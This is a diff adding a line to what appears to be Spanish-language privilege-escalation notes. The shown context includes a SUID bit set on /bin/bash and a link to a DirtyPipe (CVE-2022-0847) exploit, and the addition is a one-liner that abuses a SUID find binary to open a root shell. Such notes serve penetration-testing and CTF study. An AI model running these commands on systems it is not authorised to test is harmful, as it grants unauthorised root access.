@@ -157,3 +157,10 @@ chmod u+s /bin/bash
 Al tener pkexec utilizamos:
 
 https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
+
+
+Si en la lista de pribilehios aparece **/usr/bin/find**
+
+<pre>
+/usr/bin/find . -exec /bin/sh -p \; -quit
+</pre>
